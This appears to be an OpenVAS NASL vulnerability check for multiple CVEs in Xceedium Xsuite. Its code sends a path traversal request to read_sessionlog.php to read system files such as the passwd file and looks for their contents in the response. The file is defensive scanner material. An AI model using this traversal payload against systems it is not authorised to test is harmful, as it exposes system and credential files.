###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xceedium_xsuite_mult_vuln.nasl 11473 2018-09-19 11:21:09Z asteins $
#
# Xceedium Xsuite Multiple Vulnerabilities
#
# Authors:
# Rinu Kuriakose <krinu@secpod.com>
#
# Copyright:
# Copyright (C) 2016 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:xceedium:xsuite";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.807086");
  script_version("$Revision: 11473 $");
  script_cve_id("CVE-2015-4665", "CVE-2015-4666", "CVE-2015-4667", "CVE-2015-4668",
                "CVE-2015-4669", "CVE-2015-4664");
  script_bugtraq_id(76501, 76500);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-09-19 13:21:09 +0200 (Wed, 19 Sep 2018) $");
  script_tag(name:"creation_date", value:"2016-03-03 18:23:47 +0530 (Thu, 03 Mar 2016)");
  script_name("Xceedium Xsuite Multiple Vulnerabilities");

  script_tag(name:"summary", value:"This host is installed with Xceedium Xsuite
  and is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not.");

  script_tag(name:"insight", value:"Multiple flaws are due to:

  - An insufficient validation of input via 'id' POST  parameter.

  - An insufficient validation of input via 'fileName' parameter in
    'ajax_cmd.php' script.

  - An insufficient input validation via 'logFile' parameter in
    read_sessionlog.php script.

  - An insufficient input validation via 'spadmind' process.

  - An improper password management.

  - An insufficient input validation via 'redirurl' parameter in
    openwin.php script.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to inject arbitrary commands, read arbitrary files, to bypass
  security restrictions, to inject arbitrary web script or HTML and
  allows local  users to escalate their privileges.");

  script_tag(name:"affected", value:"Xceedium Xsuite 2.3.0 and 2.4.3.0");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37708");
  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/132809");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_xceedium_xsuite_remote_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("Xceedium/Xsuite/Installed");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + '/opm/read_sessionlog.php?logFile=....//....//....//....//' + files[file];

  sndReq = http_get(item:url,  port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes =~ 'HTTP/1.. 200 OK' &&
     (rcvRes =~ 'root:.*:0:[01]:' || '; for 16-bit app support' >< rcvRes ||
     '[boot loader]' >< rcvRes))
  {
    report = report_vuln_url(port:http_port, url:url);
    security_message(port:http_port, data:report);
    exit(0);
  }
}
